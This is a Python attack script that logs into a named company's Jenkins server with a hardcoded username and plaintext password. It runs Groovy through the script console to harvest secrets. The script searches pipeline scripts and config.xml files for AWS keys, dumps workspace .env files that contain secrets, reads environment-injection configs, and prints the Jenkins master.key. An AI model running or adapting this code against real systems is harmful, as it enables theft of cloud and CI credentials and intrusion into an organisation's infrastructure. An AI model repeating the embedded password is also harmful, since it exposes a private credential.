import requests
import urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False

crumb_r = s.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
crumb_r.raise_for_status()
crumb_data = crumb_r.json()
crumb_header = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
print(f"[+] Crumb OK")


def run_groovy(script, label="", timeout=50):
    print(f"\n{'='*80}\n[*] {label}")
    try:
        resp = s.post(
            f"{JENKINS}/scriptText",
            data={"script": script, crumb_header: crumb_value},
            timeout=timeout
        )
        print(f"[+] Status: {resp.status_code} | Length: {len(resp.text)}")
        if resp.status_code == 200:
            print(resp.text)
        else:
            print(resp.text[:500])
        return resp.text if resp.status_code == 200 else ""
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""


# Q1: Search pipeline scripts (Jenkinsfile configs) for AWS patterns
q1 = r'''
import jenkins.model.Jenkins
import org.jenkinsci.plugins.workflow.job.WorkflowJob

def found = []
Jenkins.instance.allItems(WorkflowJob.class).take(80).each { job ->
    try {
        def script = job.definition?.script
        if (script && script =~ /(?i)(AWS_|AKIAJ|S3_|SECRET_KEY|ACCESS_KEY)/) {
            found << "JOB: ${job.fullName}"
            script.eachLine { line ->
                if (line =~ /(?i)(AWS_|AKIAJ|S3_|SECRET_KEY|ACCESS_KEY|aws_)/) {
                    found << "  ${line.trim()}"
                }
            }
        }
    } catch(e) {}
}
println "=== PIPELINE SCRIPTS WITH AWS KEYS (${found.size()} lines) ==="
found.take(100).each { println it }
'''
run_groovy(q1, "PIPELINE SCRIPTS WITH AWS")

# Q2: Check workspace dirs for .env files
q2 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home/workspace -maxdepth 4 -name '.env' -o -name '*.env' 2>/dev/null | head -30"].execute()
proc.waitFor()
println "=== .env FILES IN WORKSPACES ==="
println proc.text
'''
run_groovy(q2, "WORKSPACE .ENV FILES")

# Q3: Read specific workspace .env files
q3 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home/workspace -maxdepth 4 -name '*.env' 2>/dev/null"].execute()
proc.waitFor()
def files = proc.text.trim().split('\n').findAll { it }
println "=== DUMPING .env FILES (${files.size()} found) ==="
files.take(10).each { path ->
    try {
        def content = new File(path).text
        if (content =~ /(?i)(AWS|S3|SECRET|KEY|TOKEN|PASS|DB_)/) {
            println "\n--- ${path} ---"
            println content.take(5000)
        }
    } catch(e) {}
}
'''
run_groovy(q3, "DUMP WORKSPACE .ENV FILES WITH SECRETS")

# Q4: grep config.xml files for AWS inline
q4 = r'''
def proc = ["bash", "-c", "grep -r -h 'AKIAJ\\|aws_access\\|aws_secret\\|AWS_ACCESS\\|AWS_SECRET\\|S3_KEY\\|S3_SECRET\\|S3_BUCKET' /var/jenkins_home/jobs/ --include='config.xml' 2>/dev/null | sort -u | head -30"].execute()
proc.waitFor()
println "=== GREP config.xml FOR AWS ==="
println proc.text
'''
run_groovy(q4, "GREP CONFIG.XML FOR AWS INLINE")

# Q5: Check for EnvInject or masked builds
q5 = r'''
def proc = ["bash", "-c", "grep -r -l 'EnvInject\\|envInject\\|propertiesContent' /var/jenkins_home/jobs/ --include='config.xml' 2>/dev/null | head -15"].execute()
proc.waitFor()
def files = proc.text.trim().split('\n').findAll { it }
println "=== JOBS WITH ENV INJECTION (${files.size()}) ==="
files.take(8).each { path ->
    println "\n--- ${path} ---"
    try {
        def content = new File(path).text
        def lines = content.split('\n')
        lines.eachWithIndex { line, idx ->
            if (line =~ /(?i)(propertiesContent|EnvInject|envVars|envInject)/) {
                println lines[(Math.max(0,idx-1))..(Math.min(lines.size()-1,idx+10))].join('\n')
                println "..."
            }
        }
    } catch(e) { println "ERR: ${e.message}" }
}
'''
run_groovy(q5, "ENV INJECTION CONFIGS")

# Q6: Look for secrets in /var/jenkins_home/secrets
q6 = r'''
def proc = ["bash", "-c", "ls -la /var/jenkins_home/secrets/ 2>/dev/null && echo '---' && cat /var/jenkins_home/secrets/master.key 2>/dev/null && echo '---' && find /var/jenkins_home -name 'hudson.util.Secret' 2>/dev/null"].execute()
proc.waitFor()
println "=== JENKINS SECRETS DIR ==="
println proc.text
'''
run_groovy(q6, "JENKINS SECRETS DIRECTORY")
